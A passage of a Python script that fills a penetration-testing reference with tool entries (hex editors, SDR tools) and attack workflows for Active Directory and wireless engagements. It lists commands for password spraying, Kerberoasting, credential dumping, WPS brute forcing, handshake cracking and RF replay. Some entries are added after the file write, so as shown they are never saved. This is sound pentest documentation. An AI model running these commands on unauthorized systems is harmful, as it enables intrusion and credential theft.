            "summary": "Install via packages or use BusyBox",
            "steps": [
                {"detail": "sudo apt install -y vim-common", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Hex dump", "command": "xxd file.bin | head", "notes": []},
        {"description": "Specify width", "command": "xxd -g1 -c16 firmware.bin", "notes": ["Byte-wise groups"]},
        {"description": "Reverse dump", "command": "xxd -r patched.hex patched.bin", "notes": ["Convert hex back to binary"]}
    ],
    "common_flags": [
        {"flag": "-g <bytes>", "description": "Bytes per group"},
        {"flag": "-c <cols>", "description": "Bytes per line"},
        {"flag": "-r", "description": "Reverse operation"},
        {"flag": "-s offset", "description": "Skip bytes before dumping"}
    ],
    "operational_tips": [
        "Combine with sed/awk to patch single bytes via hex editing.",
        "Use -ps to output plain hex stream for scripting or network payloads.",
        "When reversing, ensure there are no extra spaces/offsets in the hex file.",
        "Document offsets inside PT Journal so others can reproduce the patch." 
    ],
    "step_sequences": [
        {
            "title": "Binary diff",
            "steps": [
                {"title": "Dump both files", "details": "Create comparable hex dumps.", "command": "xxd -g1 -c16 old.bin > old.hex && xxd -g1 -c16 new.bin > new.hex"},
                {"title": "Compare", "details": "Use diff to see byte changes.", "command": "diff -u old.hex new.hex"},
                {"title": "Patch", "details": "Edit hex and reverse.", "command": "xxd -r new.hex patched.bin"}
            ]
        },
        {
            "title": "Inline modification",
            "steps": [
                {"title": "Dump region", "details": "Focus on offset.", "command": "xxd -g1 -s 0x100 -l 32 target.bin"},
                {"title": "Edit hex", "details": "Change bytes with editor.", "command": "xxd -g1 target.bin > temp.hex && vim temp.hex"},
                {"title": "Rebuild", "details": "Convert back to binary.", "command": "xxd -r temp.hex target.bin"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Dump → Edit → Validate",
            "stages": [
                {"label": "Dump", "description": "Create baseline hex file.", "command": "xxd -g1 firmware.bin > firmware.hex"},
                {"label": "Edit", "description": "Modify bytes for patch/PoC.", "command": "vim firmware.hex"},
                {"label": "Rebuild", "description": "Reverse hex back to binary.", "command": "xxd -r firmware.hex firmware_patched.bin"},
                {"label": "Validate", "description": "Hash + run tests to confirm change.", "command": "sha256sum firmware_patched.bin"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "00000100: 41 42 43", "meaning": "Offset and bytes displayed.", "severity": "Info"},
        {"indicator": "xxd: unexpected EOF", "meaning": "Likely missing newline or truncated hex on reverse.", "severity": "Medium"},
        {"indicator": "Binary file matches", "meaning": "After reverse, file identical—patch succeeded.", "severity": "Info"}
    ],
    "advanced_usage": [
        {"title": "Plain hex stream", "command": "xxd -p shellcode.bin | tr -d '\n'", "scenario": "Embed shellcode into exploits.", "notes": ["Use -c to control width"]},
        {"title": "Network patching", "command": "printf '00000010: 90 90 90\n' | xxd -r - firmware.bin", "scenario": "Patch bytes directly from stdin.", "notes": ["Handy for quick nop sled inserts"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "xxd manual", "url": "https://linux.die.net/man/1/xxd", "description": "Official options."},
        {"label": "Binary patching tutorial", "url": "https://reverseengineering.stackexchange.com/questions/9135/", "description": "Common workflows."},
        {"label": "Hex editing with vim", "url": "https://vimhelp.org/repeat.txt.html#:%20XXD", "description": "Use xxd within Vim."}
    ]
}
updates['hexedit'] = {
    "id": "hexedit",
    "name": "hexedit",
    "summary": "hexedit is a terminal-based hexadecimal editor for navigating and modifying binary files interactively.",
    "installation_guides": [
        {
            "platform": "Debian/Ubuntu",
            "summary": "Install via apt",
            "steps": [
                {"detail": "sudo apt update", "copyable": True},
                {"detail": "sudo apt install -y hexedit", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Preinstalled",
            "steps": [
                {"detail": "hexedit --version", "copyable": True}
            ]
        },
        {
            "platform": "macOS",
            "summary": "Install via Homebrew",
            "steps": [
                {"detail": "brew install hexedit", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Open binary", "command": "hexedit firmware.bin", "notes": []},
        {"description": "Jump to offset", "command": "# Press Ctrl+_ then enter hex offset", "notes": []},
        {"description": "Save changes", "command": "# Press F2 to write file", "notes": []}
    ],
    "common_flags": [
        {"flag": "-s", "description": "Start at offset"},
        {"flag": "-m", "description": "Read-only mode"},
        {"flag": "-l <len>", "description": "Limit file length"}
    ],
    "operational_tips": [
        "Use read-only (-m) when triaging evidence to avoid accidental writes.",
        "Combine with xxd exports for before/after diffs.",
        "Press Tab to toggle between hex and ASCII editing modes.",
        "Document modifications in PT Journal with offsets for reproducibility." 
    ],
    "step_sequences": [
        {
            "title": "Patch workflow",
            "steps": [
                {"title": "Open file", "details": "Launch hexedit in read/write mode.", "command": "hexedit target.bin"},
                {"title": "Navigate", "details": "Jump to offset needing patch.", "command": "Ctrl+_ then offset"},
                {"title": "Modify", "details": "Edit bytes and save with F2.", "command": "# After editing press F2"}
            ]
        },
        {
            "title": "Read-only review",
            "steps": [
                {"title": "Open in safe mode", "details": "Prevent writes.", "command": "hexedit -m evidence.img"},
                {"title": "Take notes", "details": "Record offsets/values.", "command": "# Use PT Journal note template"},
                {"title": "Export region", "details": "Use xxd for attachments.", "command": "xxd -s 0x200 -l 64 evidence.img"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Inspect → Patch → Validate",
            "stages": [
                {"label": "Inspect", "description": "Open file in hexedit -m.", "command": "hexedit -m firmware.bin"},
                {"label": "Patch", "description": "Remove -m and modify bytes.", "command": "hexedit firmware.bin"},
                {"label": "Validate", "description": "Hash files and test.", "command": "sha256sum firmware.bin"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "EOF reached", "meaning": "You attempted to move past file size.", "severity": "Info"},
        {"indicator": "File is read only", "meaning": "Launched with -m or lacking permissions.", "severity": "Medium"},
        {"indicator": "Write failed", "meaning": "Disk permission or attribute prevents saving.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Template editing", "command": "hexedit -s 0x100 -l 0x40 firmware.bin", "scenario": "Limit view to region for safer patching.", "notes": ["Use with -m for initial review"]},
        {"title": "Automated record", "command": "script -q hexedit-session.txt hexedit firmware.bin", "scenario": "Capture keystrokes for chain-of-custody.", "notes": ["Stop recording with exit"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "hexedit man page", "url": "https://linux.die.net/man/1/hexedit", "description": "Official usage."},
        {"label": "Binary patching primer", "url": "https://www.cc.gatech.edu/~brunzema/CS3651/readings/hexediting.pdf", "description": "Background for new analysts."},
        {"label": "Live forensics tips", "url": "https://resources.infosecinstitute.com/topic/hex-editors-for-forensics/", "description": "When to use hexedit vs GUI editors."}
    ]
}
updates['hackrf'] = {
    "id": "hackrf",
    "name": "HackRF One",
    "summary": "HackRF One is a half-duplex SDR transceiver (1 MHz – 6 GHz) commonly used for wireless security research and signal replay.",
    "installation_guides": [
        {
            "platform": "Firmware & tools",
            "summary": "Install host utilities and update firmware",
            "steps": [
                {"detail": "sudo apt install -y hackrf libhackrf-dev", "copyable": True},
                {"detail": "sudo hackrf_info", "copyable": True},
                {"detail": "sudo hackrf_spiflash -w hackrf_one_usb.bin", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Enable SDR group permissions",
            "steps": [
                {"detail": "sudo usermod -aG plugdev $USER", "copyable": True},
                {"detail": "sudo udevadm control --reload-rules", "copyable": True}
            ]
        },
        {
            "platform": "Windows", "summary": "Use Zadig drivers",
            "steps": [
                {"detail": "Install Zadig and replace driver with WinUSB", "copyable": False}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Device info", "command": "hackrf_info", "notes": []},
        {"description": "Spectrum sweep", "command": "hackrf_sweep -f 2.4G:2.5G -n 4096 -w 1000000", "notes": []},
        {"description": "Record signal", "command": "hackrf_transfer -r wifi.iq -f 2462000000 -s 20000000", "notes": ["Produces IQ file"]}
    ],
    "common_flags": [
        {"flag": "-f freq", "description": "Center frequency"},
        {"flag": "-s rate", "description": "Sample rate"},
        {"flag": "-a 1", "description": "Enable antenna power"},
        {"flag": "-g gain", "description": "VGA gain"}
    ],
    "operational_tips": [
        "Always calibrate (hackrf_debug --si5351c -n 0 -w 26) after firmware updates.",
        "Use external filters/amps when dealing with cellular/L-band signals to avoid front-end overload.",
        "Record IQ data for offline analysis with GNU Radio or URH.",
        "Respect legal/regional power limits; HackRF can transmit across wide bands." 
    ],
    "step_sequences": [
        {
            "title": "Capturing key fob",
            "steps": [
                {"title": "Find frequency", "details": "Use hackrf_sweep to locate strong carriers.", "command": "hackrf_sweep -f 300M:400M"},
                {"title": "Record IQ", "details": "Capture raw transmission.", "command": "hackrf_transfer -r keyfob.iq -f 315000000 -s 2000000 -a 1"},
                {"title": "Analyze", "details": "Load capture into URH/GNU Radio.", "command": "urh keyfob.iq"}
            ]
        },
        {
            "title": "Replay lab signal",
            "steps": [
                {"title": "Transmit capture", "details": "Use hackrf_transfer to replay.", "command": "hackrf_transfer -t keyfob.iq -f 315000000 -s 2000000 -a 1"},
                {"title": "Verify", "details": "Check target response.", "command": "# Observe device behavior"},
                {"title": "Document", "details": "Record capture settings for report.", "command": "# PT Journal → Evidence"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Survey → Capture → Replay",
            "stages": [
                {"label": "Survey", "description": "Sweep bands for active signals.", "command": "hackrf_sweep -f 900M:930M"},
                {"label": "Capture", "description": "Record IQ with proper gain.", "command": "hackrf_transfer -r capture.iq -f 915000000 -s 10000000"},
                {"label": "Replay/Decode", "description": "Feed IQ into GNURadio/URH for decode or re-transmit.", "command": "urh capture.iq"},
                {"label": "Report", "description": "Share reproduction steps and mitigate.", "command": "# PT Journal → Wireless finding"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "hackrf_info: board ID", "meaning": "Device recognized and ready.", "severity": "Info"},
        {"indicator": "Lost samples", "meaning": "Sample rate too high or USB throughput low.", "severity": "Medium"},
        {"indicator": "PLL unlock", "meaning": "Out-of-range frequency or hardware issue.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Remote HackRF", "command": "hackrf_tcp -s 2000000", "scenario": "Expose HackRF over network and connect via SoapySDR/GNU Radio.", "notes": ["Protect port with SSH tunnel"]},
        {"title": "Clock synchronization", "command": "hackrf_clock -i 10MHz", "scenario": "Lock device to external reference for precise measurements.", "notes": ["Requires clock-in mod"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Great Scott Gadgets docs", "url": "https://greatscottgadgets.com/hackrf/", "description": "Official handbook."},
        {"label": "HackRF tools", "url": "https://github.com/greatscottgadgets/hackrf", "description": "Firmware + utilities."},
        {"label": "RF best practices", "url": "https://osmocom.org/projects/hackrf/wiki", "description": "Field notes and tutorials."}
    ]
}
for entry_id, payload in updates.items():
    for idx, entry in enumerate(data):
        if entry.get("id") == payload["id"]:
            data[idx] = payload
            break
    else:
        raise SystemExit(f"ID {entry_id} not found in instructions.json")

path.write_text(json.dumps(data, indent=2) + "\n")
updates['gqrx'] = {
    "id": "gqrx",
    "name": "Gqrx",
    "summary": "Gqrx is a GNU Radio–based SDR receiver with FFT waterfall, demodulation, and recording features for quick signal reconnaissance.",
    "installation_guides": [
        {
            "platform": "Ubuntu/Debian",
            "summary": "Install from official PPA",
            "steps": [
                {"detail": "sudo add-apt-repository -y ppa:gqrx/gqrx-sdr", "copyable": True},
                {"detail": "sudo apt update && sudo apt install -y gqrx-sdr", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Install packaged build",
            "steps": [
                {"detail": "sudo apt install -y gqrx-sdr gr-osmosdr", "copyable": True}
            ]
        },
        {
            "platform": "AppImage",
            "summary": "Portable option for field kits",
            "steps": [
                {"detail": "wget https://gqrx.dk/download/gqrx-x86_64.AppImage", "copyable": True},
                {"detail": "chmod +x gqrx-x86_64.AppImage && ./gqrx-x86_64.AppImage", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Launch receiver", "command": "gqrx", "notes": ["Select SDR device on first run"]},
        {"description": "Record IQ", "command": "# Toolbar → Record IQ (Ctrl+R)", "notes": []},
        {"description": "Use frequency scanner", "command": "# Tools → Frequency Scanner", "notes": []}
    ],
    "common_flags": [
        {"flag": "--device <string>", "description": "Override device arguments"},
        {"flag": "--config <file>", "description": "Load saved configuration"},
        {"flag": "--remote", "description": "Enable TCP remote control"}
    ],
    "operational_tips": [
        "Lower sample rate if you see 'lost samples' in the status bar.",
        "Enable DC removal and I/Q correction for HackRF/LimeSDR to clean center spikes.",
        "Bookmark active channels and export them for wardriving reports.",
        "Record IQ for intermittent signals so they can be replayed in GNURadio or URH." 
    ],
    "step_sequences": [
        {
            "title": "Band survey",
            "steps": [
                {"title": "Scan", "details": "Use frequency scanner to sweep ISM band.", "command": "# Tools → Frequency Scanner"},
                {"title": "Bookmark", "details": "Add bookmarks for interesting carriers.", "command": "# Right-click waterfall → Bookmark"},
                {"title": "Export", "details": "Save bookmarks.csv for sharing.", "command": "# Bookmarks → Export"}
            ]
        },
        {
            "title": "IQ capture",
            "steps": [
                {"title": "Tune", "details": "Set frequency/gain based on signal of interest.", "command": "# Receiver Options"},
                {"title": "Record", "details": "Start IQ capture.", "command": "# Press Record"},
                {"title": "Analyze", "details": "Open IQ file with GNURadio/URH.", "command": "urh recordings/*.wav"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Survey → Capture → Decode",
            "stages": [
                {"label": "Survey", "description": "Use Gqrx waterfall to locate emitters.", "command": "gqrx --config survey.conf"},
                {"label": "Capture", "description": "Record IQ segments when activity appears.", "command": "# Press Record"},
                {"label": "Decode", "description": "Process IQ in URH or GNURadio Companion.", "command": "urh recordings/iq.dat"},
                {"label": "Report", "description": "Attach screenshots + IQ excerpts to PT Journal.", "command": "# PT Journal → Wireless evidence"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "ALSA underrun", "meaning": "Audio device cannot keep up; lower audio sample rate or use PulseAudio.", "severity": "Low"},
        {"indicator": "Overload warning", "meaning": "Gain too high; reduce LNA/VGA to avoid clipping.", "severity": "Medium"},
        {"indicator": "Lost samples", "meaning": "USB throughput or CPU limit reached.", "severity": "Medium"}
    ],
    "advanced_usage": [
        {"title": "Headless control", "command": "gqrx --remote --config remote.conf", "scenario": "Enable TCP remote control and script tuning/recording.", "notes": ["Enable Remote Control checkbox in settings first"]},
        {"title": "Preset launch", "command": "gqrx --config ism.conf --device='rtl=0,samplerate=2.4e6'", "scenario": "Start with predefined center frequency and gain for lab demos.", "notes": ["Combine with gqrx-remote CLI"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "Gqrx documentation", "url": "https://gqrx.dk/documents", "description": "Official guides"},
        {"label": "Remote control API", "url": "https://github.com/gqrx-sdr/gqrx-sdr/wiki/Remote-control", "description": "Automate tuning"},
        {"label": "SDR Academy", "url": "https://greatscottgadgets.com/sdr/", "description": "Signal hacking fundamentals"}
    ]
}
updates['gnuradio'] = {
    "id": "gnuradio",
    "name": "GNU Radio",
    "summary": "GNU Radio is an open-source DSP framework used to build SDR applications, signal decoders, and rapid RF prototypes.",
    "installation_guides": [
        {
            "platform": "PyBOMBS",
            "summary": "Install via PyBOMBS workspace",
            "steps": [
                {"detail": "pip3 install pybombs --user", "copyable": True},
                {"detail": "pybombs auto-config", "copyable": True},
                {"detail": "pybombs prefix init ~/gnuradio -a myprefix -R gnuradio-default", "copyable": True}
            ]
        },
        {
            "platform": "Ubuntu PPA",
            "summary": "Quick install",
            "steps": [
                {"detail": "sudo add-apt-repository -y ppa:gnuradio/gnuradio-releases", "copyable": True},
                {"detail": "sudo apt update && sudo apt install -y gnuradio gr-osmosdr", "copyable": True}
            ]
        },
        {
            "platform": "Conda",
            "summary": "Isolated environment",
            "steps": [
                {"detail": "conda create -n gr python=3.10 gnuradio", "copyable": True},
                {"detail": "conda activate gr", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Launch GRC", "command": "gnuradio-companion", "notes": []},
        {"description": "Run flowgraph headless", "command": "python3 top_block.py", "notes": []},
        {"description": "Use gr_modtool", "command": "gr_modtool newmod custom", "notes": ["Create custom blocks"]}
    ],
    "common_flags": [
        {"flag": "gnuradio-companion -w", "description": "Disable splash screen"},
        {"flag": "python3 flowgraph.py --args", "description": "Pass runtime parameters"},
        {"flag": "gr_modtool add -t general", "description": "Add new block"}
    ],
    "operational_tips": [
        "Group blocks into hierarchical blocks for readability.",
        "Use Message Debug blocks to inspect PDUs when troubleshooting.",
        "Keep sampling rates realistic for your hardware to avoid overruns.",
        "Export companion flowgraphs to Python when integrating with automation." 
    ],
    "step_sequences": [
        {
            "title": "Building receiver",
            "steps": [
                {"title": "Prototype in GRC", "details": "Use blocks (osmocom source → low pass → WBFM).", "command": "gnuradio-companion"},
                {"title": "Test", "details": "Run from GUI and adjust gains.", "command": "# Press Run"},
                {"title": "Export", "details": "Generate Python flowgraph for automation.", "command": "File → Generate"}
            ]
        },
        {
            "title": "Custom block",
            "steps": [
                {"title": "Create module", "details": "Start new module.", "command": "gr_modtool newmod ptj_blocks"},
                {"title": "Add block", "details": "Create custom general block.", "command": "gr_modtool add -t general packet_tag"},
                {"title": "Build", "details": "Compile and install.", "command": "cmake .. && make && sudo make install"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Prototype → Test → Deploy",
            "stages": [
                {"label": "Prototype", "description": "Use GRC to drag/drop blocks.", "command": "gnuradio-companion --new"},
                {"label": "Test", "description": "Run with live SDR input.", "command": "python3 flowgraph.py --args 'uhd,addr=192.168.10.2'"},
                {"label": "Deploy", "description": "Package flowgraph into Docker/automation pipeline.", "command": "docker build -t gr-receiver ."},
                {"label": "Document", "description": "Attach screenshots/config to PT Journal.", "command": "# PT Journal → Wireless lab"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "UHD: O", "meaning": "Overrun; SDR not keeping up.", "severity": "Medium"},
        {"indicator": "ALSA underrun", "meaning": "Audio sink can't keep pace.", "severity": "Low"},
        {"indicator": "Flowgraph locked", "meaning": "Top block running.", "severity": "Info"}
    ],
    "advanced_usage": [
        {"title": "Out-of-tree blocks", "command": "gr_modtool makexml custom.xml", "scenario": "Share custom DSP modules across team.", "notes": ["Version control modules separately"]},
        {"title": "Remote headless run", "command": "python3 flowgraph.py --remote-port 5656", "scenario": "Expose control port for dashboards.", "notes": ["Requires network sink blocks"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "GNU Radio docs", "url": "https://wiki.gnuradio.org/index.php/Main_Page", "description": "Official documentation"},
        {"label": "GRCon talks", "url": "https://www.gnuradio.org/grcon/grcon-content/", "description": "Conference recordings"},
        {"label": "DSP tutorials", "url": "https://greatscottgadgets.com/sdr/", "description": "Foundational SDR guide"}
    ]
}
updates['urh'] = {
    "id": "urh",
    "name": "Universal Radio Hacker",
    "summary": "URH visualizes and decodes captured RF signals, helps reverse protocols, and can generate replay or fuzzing frames.",
    "installation_guides": [
        {
            "platform": "pip",
            "summary": "Install URH with Qt dependencies",
            "steps": [
                {"detail": "pip3 install urh", "copyable": True}
            ]
        },
        {
            "platform": "AppImage",
            "summary": "Portable release",
            "steps": [
                {"detail": "wget https://github.com/jopohl/urh/releases/download/v2.9.7/urh-x86_64.AppImage", "copyable": True},
                {"detail": "chmod +x urh-x86_64.AppImage && ./urh-x86_64.AppImage", "copyable": True}
            ]
        },
        {
            "platform": "Kali Linux",
            "summary": "Install via apt",
            "steps": [
                {"detail": "sudo apt install -y urh", "copyable": True}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Launch GUI", "command": "urh", "notes": []},
        {"description": "Import IQ file", "command": "# File → Import → Signals", "notes": []},
        {"description": "Replay burst", "command": "# Emulator tab → Play", "notes": []}
    ],
    "common_flags": [
        {"flag": "urh --device hackrf", "description": "Select SDR device"},
        {"flag": "--import mycapture.iq", "description": "Open file on startup"},
        {"flag": "--no-splash", "description": "Skip splash screen"}
    ],
    "operational_tips": [
        "Use the inspector to highlight symbol boundaries before protocol analysis.",
        "Switch to relative view to normalize amplitude differences across captures.",
        "Use labelled sequences to teach URH patterns, then use Analyzer → Protocol search.",
        "Export decoded frames to CSV for inclusion in PT Journal." 
    ],
    "step_sequences": [
        {
            "title": "Protocol reverse engineering",
            "steps": [
                {"title": "Import IQ", "details": "Load capture from HackRF/Gqrx.", "command": "urh capture.iq"},
                {"title": "Detect symbols", "details": "Use Automatic detection.", "command": "# Analyzer → Auto detect"},
                {"title": "Label fields", "details": "Mark header/address/payload.", "command": "# Use Label button"}
            ]
        },
        {
            "title": "Replay attack",
            "steps": [
                {"title": "Load burst", "details": "Select recorded sequence.", "command": "# Signals tab → Add"},
                {"title": "Configure device", "details": "Set HackRF center frequency/gain.", "command": "# Emulator tab"},
                {"title": "Transmit", "details": "Play burst and observe target.", "command": "# Click Play"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Capture → Decode → Replay",
            "stages": [
                {"label": "Capture", "description": "Use HackRF/Gqrx to record signal.", "command": "hackrf_transfer -r device.iq"},
                {"label": "Decode", "description": "Import into URH and derive protocol.", "command": "urh device.iq"},
                {"label": "Replay", "description": "Send crafted frames to validate findings.", "command": "# Emulator tab"},
                {"label": "Document", "description": "Export plots/CSV for PT Journal.", "command": "# File → Export"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Bitrate auto detected", "meaning": "URH guessed symbol rate; verify manually.", "severity": "Info"},
        {"indicator": "Alignment lost", "meaning": "Need better slicing points.", "severity": "Medium"},
        {"indicator": "Tx busy", "meaning": "SDR not configured properly for transmit.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Batch fuzzing", "command": "urh --fuzz scripts/fuzz.py", "scenario": "Automate sending mutated frames.", "notes": ["Requires scripting plug-in"]},
        {"title": "Headless export", "command": "urh --export-csv sequences.urh", "scenario": "Convert labelled protocols into CSV for reporting.", "notes": ["Useful for PT Journal attachments"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "URH docs", "url": "https://github.com/jopohl/urh", "description": "Official documentation"},
        {"label": "RF reverse engineering guide", "url": "https://greatscottgadgets.com/sdr/", "description": "Background training"},
        {"label": "URH tutorials", "url": "https://www.youtube.com/playlist?list=PLt3zZlbrTrWf9NBI6sD3A3p0hN82F_9xZ", "description": "Video walkthroughs"}
    ]
}
updates['workflow_internal_network_ptes'] = {
    "id": "workflow_internal_network_ptes",
    "name": "Internal Network Penetration Testing with AD Focus",
    "summary": "Structured PTES-compliant workflow for internal corporate networks with Active Directory, covering recon through reporting.",
    "details": "Use this workflow when performing internal penetration tests where credentials or LAN access are provided. It aligns to PTES phases and emphasizes stealth, lateral movement, and privilege escalation in AD environments.",
    "installation_guides": [
        {
            "platform": "Prerequisites",
            "summary": "Tools to stage before engagement",
            "steps": [
                {"detail": "Install enum4linux, CrackMapExec, BloodHound, and Impacket", "copyable": False},
                {"detail": "Deploy password spraying lists (Seclists) and configure Kerbrute", "copyable": False},
                {"detail": "Prepare reporting workspace (Dradis/Faraday/PT Journal templates)", "copyable": False}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Baseline AD recon", "command": "enum4linux -a 10.0.0.5", "notes": []},
        {"description": "Password spray", "command": "crackmapexec smb 10.0.0.0/24 -u users.txt -p 'Winter2024!' --continue-on-success", "notes": []}
    ],
    "step_sequences": [
        {
            "title": "Phase 1: Recon & Enumeration",
            "steps": [
                {"title": "Network sweep", "details": "Identify live hosts and critical services.", "command": "nmap -sS -p 445,389,5985 10.0.0.0/24"},
                {"title": "AD data gathering", "details": "Pull domain info without creds.", "command": "crackmapexec smb 10.0.0.0/24 --shares"},
                {"title": "BloodHound data", "details": "Collect LDAP data for pathing.", "command": "bloodhound-python -d corp.local -u svc -p Pass123 -gc dc1.corp.local -c All"}
            ]
        },
        {
            "title": "Phase 2: Credential Access",
            "steps": [
                {"title": "Password spraying", "details": "Use safe lists and lockout thresholds.", "command": "kerbrute passwordspray --dc dc1.corp.local -d corp.local users.txt Winter2024!"},
                {"title": "Kerberoasting", "details": "Request SPN tickets for cracking.", "command": "GetUserSPNs.py corp.local/user:pass -request"},
                {"title": "Local loot", "details": "Dump creds via LSASS when allowed.", "command": "impacket-secretsdump corp.local/user@host"}
            ]
        },
        {
            "title": "Phase 3: Lateral Movement & Escalation",
            "steps": [
                {"title": "Token reuse", "details": "Leverage admin sessions for PSExec/WinRM.", "command": "crackmapexec winrm targets.txt -H hash"},
                {"title": "Path of attack", "details": "Use BloodHound queries for privesc.", "command": "MATCH p=shortestPath((u:User {name:'USER'}),(g:Group {name:'DOMAIN ADMINS'})) RETURN p"},
                {"title": "Persistence", "details": "Document scheduled tasks/backdoors if in scope.", "command": "PowerView Add-ObjectAcl"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Internal PTES timeline",
            "stages": [
                {"label": "Day 1", "description": "Recon + host discovery.", "command": "masscan 10.0.0.0/16 -p445"},
                {"label": "Day 2", "description": "Credential harvesting and spraying.", "command": "kerbrute passwordspray ..."},
                {"label": "Day 3", "description": "Privilege escalation + lateral movement.", "command": "bloodhound -c All"},
                {"label": "Day 4", "description": "Persistence testing + data access.", "command": "rubeus asktgt"},
                {"label": "Day 5", "description": "Reporting + cleanup.", "command": "# PT Journal reporting template"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "Kerberos pre-auth not required", "meaning": "AS-REP roast candidate.", "severity": "High"},
        {"indicator": "AdminCount=1 user", "meaning": "Account protected by AdminSDHolder; requires caution.", "severity": "Medium"},
        {"indicator": "Failed logon storm", "meaning": "Password spray detected—slow down or pause.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Automated attack pathing", "command": "bloodhound --auto --skip-collection", "scenario": "Use preloaded datasets to compute attack paths quickly.", "notes": ["Update queries per client scope"]},
        {"title": "Delegated credential theft", "command": "Rubeus.exe harvest /interval:30", "scenario": "Monitor for unconstrained delegation tickets.", "notes": ["Log timeline for reporting"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "PTES", "url": "http://www.pentest-standard.org/", "description": "Methodology reference"},
        {"label": "SpecterOps AD cheat sheet", "url": "https://posts.specterops.io/", "description": "Modern AD attack primitives"},
        {"label": "BloodHound docs", "url": "https://bloodhound.readthedocs.io", "description": "Path-finding guidance"}
    ]
}
updates['workflow_wireless_security_assessment'] = {
    "id": "workflow_wireless_security_assessment",
    "name": "Wireless Security Assessment Workflow",
    "summary": "Methodology for WiFi/Bluetooth assessments covering scoping, discovery, exploitation, and reporting.",
    "details": "Use this workflow for wireless network and device engagements following PTES. It balances onsite logistics (survey, rogue AP detection) with lab-based cracking and reporting.",
    "installation_guides": [
        {
            "platform": "Prerequisites",
            "summary": "Equipment & tools",
            "steps": [
                {"detail": "Two wireless cards capable of monitor/injection (ath9k/mt76)", "copyable": False},
                {"detail": "aircrack-ng suite, Bettercap, Kismet", "copyable": False},
                {"detail": "GPS logger + PT Journal templates for site survey", "copyable": False}
            ]
        }
    ],
    "quick_examples": [
        {"description": "Site survey", "command": "kismet -c wlan0mon", "notes": []},
        {"description": "Handshake capture", "command": "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w corp wlan0mon", "notes": []}
    ],
    "step_sequences": [
        {
            "title": "Recon phase",
            "steps": [
                {"title": "Passive survey", "details": "Map APs/clients.", "command": "kismet -c wlan0mon"},
                {"title": "GPS logging", "details": "Record AP coordinates.", "command": "wiglewifi wardrive"},
                {"title": "Rogue detection", "details": "Scan for unauthorized SSIDs.", "command": "bettercap -caplet wifi.recon"}
            ]
        },
        {
            "title": "Attack phase",
            "steps": [
                {"title": "Handshake capture", "details": "Collect WPA/WPA2 handshakes.", "command": "airodump-ng -w corp wlan0mon"},
                {"title": "Cracking", "details": "Use GPU or hashcat service.", "command": "hashcat -m 22000 corp.hc22000 rockyou.txt"},
                {"title": "WPS tests", "details": "Brute PINs when in scope.", "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv"}
            ]
        }
    ],
    "workflow_guides": [
        {
            "name": "Wireless engagement week",
            "stages": [
                {"label": "Day 1", "description": "Recon + spectrum logging.", "command": "kismet"},
                {"label": "Day 2", "description": "Credential capture (handshakes/WPS).", "command": "reaver / aireplay"},
                {"label": "Day 3", "description": "Client attacks & rogue AP testing.", "command": "bettercap -caplet hstshijack"},
                {"label": "Day 4", "description": "Password cracking + Bluetooth tests.", "command": "hashcat"},
                {"label": "Day 5", "description": "Reporting and remediation guidance.", "command": "# PT Journal wireless template"}
            ]
        }
    ],
    "output_notes": [
        {"indicator": "WPS locked", "meaning": "Device rate-limited; document and move on.", "severity": "Info"},
        {"indicator": "Handshake saved", "meaning": "Captured WPA handshake for cracking.", "severity": "High"},
        {"indicator": "Client auto-connect", "meaning": "Device vulnerable to rogue AP/Evil Twin.", "severity": "High"}
    ],
    "advanced_usage": [
        {"title": "Automated wardriving", "command": "kismet --daemonize --log-prefix /tmp/site", "scenario": "Continuous capture while walking site.", "notes": ["Sync logs to PT Journal evidence"]},
        {"title": "PMKID harvesting", "command": "hcxdumptool -o pmkid.pcapng -i wlan0mon --enable_status=15", "scenario": "Capture PMKIDs without client interaction.", "notes": ["Use hashcat -m 22000 for cracking"]}
    ],
    "comparison_table": None,
    "resources": [
        {"label": "PTES Wireless", "url": "https://www.pentest-standard.org/index.php/PTES_Technical_Guidelines#Wireless", "description": "Methodology"},
        {"label": "Aircrack-ng docs", "url": "https://www.aircrack-ng.org/doku.php", "description": "Tool usage"},
        {"label": "Bettercap caplets", "url": "https://github.com/bettercap/caplets", "description": "Automation scripts"}
    ]
}
updates['workflow_physical_security_malware'] = {
    "id": "workflow_physical_security_malware",
    "name": "Physical Security & Malware Drop Assessment",
    "summary": "End-to-end workflow for badge testing, onsite intrusion, and controlled malware drops (USB/CD) aligned with PTES physical phase.",
